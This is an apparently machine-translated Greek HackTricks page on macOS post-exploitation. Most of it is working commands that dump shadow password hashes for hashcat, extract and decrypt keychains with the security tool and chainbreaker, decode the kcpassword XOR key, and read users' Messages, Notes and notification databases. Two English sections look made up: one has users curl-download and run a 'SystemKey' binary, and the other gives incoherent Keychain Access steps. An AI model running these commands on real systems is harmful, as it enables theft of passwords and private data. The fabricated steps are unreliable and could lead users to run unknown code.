# Ευαίσθητες Τοποθεσίες macOS

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF**, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Κωδικοί πρόσβασης

### Σκιώδεις Κωδικοί Πρόσβασης

Ο σκιώδης κωδικός πρόσβασης αποθηκεύεται μαζί με τη διαμόρφωση του χρήστη σε αρχεία plist που βρίσκονται στο **`/var/db/dslocal/nodes/Default/users/`**.\
Το παρακάτω oneliner μπορεί να χρησιμοποιηθεί για να ανακτήσει **όλες τις πληροφορίες για τους χρήστες** (συμπεριλαμβανομένων των πληροφοριών για το hash):

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**Σενάρια όπως αυτό εδώ**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) ή [**αυτό εδώ**](https://github.com/octomagon/davegrohl.git) μπορούν να χρησιμοποιηθούν για να μετατρέψουν το hash σε μορφή **hashcat**.

Ένα εναλλακτικό one-liner που θα αποθηκεύσει τα διαπιστευτήρια όλων των μη-υπηρεσιακών λογαριασμών σε μορφή hashcat `-m 7100` (macOS PBKDF2-SHA512):

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### Ανάκτηση Keychain

Σημειώστε ότι κατά τη χρήση του δυαδικού αρχείου ασφαλείας για την **ανάκτηση των αποκρυπτογραφημένων κωδικών**, θα ζητηθεί από τον χρήστη να επιτρέψει αυτήν τη λειτουργία.
```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
Βάσει αυτού του σχολίου [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) φαίνεται ότι αυτά τα εργαλεία δεν λειτουργούν πλέον στο Big Sur.
{% endhint %}

### Επισκόπηση Keychaindump

Έχει αναπτυχθεί ένα εργαλείο με το όνομα **keychaindump** για την εξαγωγή κωδικών από τα keychains του macOS, αλλά αντιμετωπίζει περιορισμούς σε νεότερες εκδόσεις του macOS όπως το Big Sur, όπως αναφέρεται σε μια [συζήτηση](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Η χρήση του **keychaindump** απαιτεί από τον επιτιθέμενο να αποκτήσει πρόσβαση και να αναβαθμίσει τα δικαιώματά του σε **root**. Το εργαλείο εκμεταλλεύεται το γεγονός ότι το keychain ξεκλειδώνεται αυτόματα κατά την είσοδο του χρήστη για την ευκολία, επιτρέποντας στις εφαρμογές να τον προσπελάσουν χωρίς να απαιτείται η επαναλαμβανόμενη εισαγωγή του κωδικού πρόσβασης του χρήστη. Ωστόσο, αν ο χρήστης επιλέξει να κλειδώσει το keychain μετά από κάθε χρήση, το **keychaindump** γίνεται αναποτελεσματικό.

Το **keychaindump** λειτουργεί στοχεύοντας ένα συγκεκριμένο διεργασία με το όνομα **securityd**, που περιγράφεται από την Apple ως ένα daemon για την εξουσιοδότηση και τις κρυπτογραφικές λειτουργίες, ουσιαστικές για την πρόσβαση στο keychain. Η διαδικασία εξαγωγής περιλαμβάνει την εντοπισμό ενός **Master Key** που προέρχεται από τον κωδικό πρόσβασης σύνδεσης του χρήστη. Αυτός ο κλειδί είναι απαραίτητος για την ανάγνωση του αρχείου keychain. Για να εντοπίσει το **Master Key**, το **keychaindump** σαρώνει την μνήμη του **securityd** χρησιμοποιώντας την εντολή `vmmap`, αναζητώντας πιθανά κλειδιά μέσα σε περιοχές που έχουν σημανθεί ως `MALLOC_TINY`. Η παρακάτω εντολή χρησιμοποιείται για τον έλεγχο αυτών των τοποθεσιών μνήμης:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Αφού εντοπιστούν πιθανά κλειδιά κύριου, το **keychaindump** αναζητά μέσω των σωρών ένα συγκεκριμένο πρότυπο (`0x0000000000000018`) που υποδηλώνει έναν υποψήφιο για το κλειδί κύριο. Περαιτέρω βήματα, συμπεριλαμβανομένης της αποκρυπτογράφησης, απαιτούνται για τη χρήση αυτού του κλειδιού, όπως περιγράφεται στον πηγαίο κώδικα του **keychaindump**. Οι αναλυτές που επικεντρώνονται σε αυτήν την περιοχή πρέπει να σημειώσουν ότι τα κρίσιμα δεδομένα για την αποκρυπτογράφηση του keychain αποθηκεύονται στη μνήμη της διεργασίας **securityd**. Ένα παράδειγμα εντολής για την εκτέλεση του **keychaindump** είναι:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) μπορεί να χρησιμοποιηθεί για να εξάγει τις ακόλουθες κατηγορίες πληροφοριών από ένα keychain του OSX με τρόπο που να είναι ασφαλής από πλευράς ανακτήσεως:

* Κωδικός πρόσβασης του Keychain σε κατακερματισμένη μορφή, κατάλληλος για αποκρυπτογράφηση με το [hashcat](https://hashcat.net/hashcat/) ή το [John the Ripper](https://www.openwall.com/john/)
* Κωδικοί πρόσβασης διαδικτύου
* Γενικοί κωδικοί πρόσβασης
* Ιδιωτικά κλειδιά
* Δημόσια κλειδιά
* X509 Πιστοποιητικά
* Ασφαλείς σημειώσεις
* Κωδικοί πρόσβασης Appleshare

Δεδομένου του κωδικού ξεκλειδώματος του keychain, ενός κύριου κλειδιού που έχει αποκτηθεί χρησιμοποιώντας το [volafox](https://github.com/n0fate/volafox) ή το [volatility](https://github.com/volatilityfoundation/volatility), ή ενός αρχείου ξεκλειδώματος όπως το SystemKey, το Chainbreaker θα παρέχει επίσης κωδικούς πρόσβασης σε απλό κείμενο.

Χωρίς έναν από αυτούς τους τρόπους ξεκλειδώματος του Keychain, το Chainbreaker θα εμφανίσει όλες τις άλλες διαθέσιμες πληροφορίες.

#### **Αποθήκευση κλειδιών του keychain**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Ανάκτηση κλειδιών keychain (με κωδικούς πρόσβασης) με το SystemKey**

To dump keychain keys (with passwords) using SystemKey, follow these steps:

1. Open Terminal.
2. Run the following command to download SystemKey:

   ```
   curl -O https://github.com/julienXX/terminal-keychain/raw/master/SystemKey
   ```

3. Make the downloaded file executable:

   ```
   chmod +x SystemKey
   ```

4. Run SystemKey with the `-d` flag to dump the keychain keys:

   ```
   ./SystemKey -d
   ```

   This will display the keychain keys along with their associated passwords.

Note: Dumping keychain keys with passwords can be a security risk, as it exposes sensitive information. Use this technique responsibly and only on systems you have proper authorization to access.
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Αποκατάσταση κλειδιών keychain (με κωδικούς πρόσβασης) σπάζοντας το hash**

To dump keychain keys and crack the hash, follow these steps:

1. Open the Keychain Access application on your macOS system.
2. Select the keychain you want to dump the keys from.
3. Click on the "Show Passwords" option.
4. Authenticate with your administrator password.
5. Copy the password hash for the key you want to crack.
6. Use a password cracking tool, such as John the Ripper or Hashcat, to crack the hash.
7. Provide the password cracking tool with the hash and let it run until it finds the password.
8. Once the password is cracked, you can use it to access the keychain key.

Keep in mind that cracking a password hash is a time-consuming process and may not always be successful. Additionally, it is important to note that unauthorized access to someone else's keychain is illegal and unethical. Only perform these actions on systems you have proper authorization for.
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Αποθήκευση κλειδιών keychain (με κωδικούς πρόσβασης) με αντίγραφο μνήμης**

[Ακολουθήστε αυτά τα βήματα](..#dumping-memory-with-osxpmem) για να πραγματοποιήσετε ένα **αντίγραφο μνήμης**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Αποθήκευση κλειδιών keychain (με κωδικούς πρόσβασης) χρησιμοποιώντας τον κωδικό πρόσβασης του χρήστη**

Εάν γνωρίζετε τον κωδικό πρόσβασης του χρήστη, μπορείτε να τον χρησιμοποιήσετε για να **αποθηκεύσετε και αποκρυπτογραφήσετε keychains που ανήκουν στον χρήστη**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

Το αρχείο **kcpassword** είναι ένα αρχείο που κατέχει το **κωδικό πρόσβασης σύνδεσης** του χρήστη, αλλά μόνο εάν ο ιδιοκτήτης του συστήματος έχει **ενεργοποιήσει την αυτόματη σύνδεση**. Έτσι, ο χρήστης θα συνδεθεί αυτόματα χωρίς να του ζητηθεί κωδικός πρόσβασης (που δεν είναι πολύ ασφαλές).

Ο κωδικός πρόσβασης αποθηκεύεται στο αρχείο **`/etc/kcpassword`** xored με το κλειδί **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Εάν ο κωδικός πρόσβασης του χρήστη είναι μεγαλύτερος από το κλειδί, το κλειδί θα επαναχρησιμοποιηθεί.\
Αυτό καθιστά τον κωδικό πρόσβασης αρκετά εύκολο να ανακτηθεί, για παράδειγμα χρησιμοποιώντας σενάρια όπως [**αυτό**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Ενδιαφέρουσες Πληροφορίες σε Βάσεις Δεδομένων

### Μηνύματα
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Ειδοποιήσεις

Μπορείτε να βρείτε τα δεδομένα των ειδοποιήσεων στο `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

Το περισσότερο από τις ενδιαφέρουσες πληροφορίες θα βρίσκονται στο **blob**. Έτσι, θα χρειαστείτε να **εξάγετε** αυτό το περιεχόμενο και να το μετατρέψετε σε μορφή που μπορεί να το διαβάσει ο άνθρωπος ή να χρησιμοποιήσετε την εντολή **`strings`**. Για να έχετε πρόσβαση, μπορείτε να κάνετε το εξής:

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
### Σημειώσεις

Οι **σημειώσεις** των χρηστών μπορούν να βρεθούν στο `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`

{% endcode %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
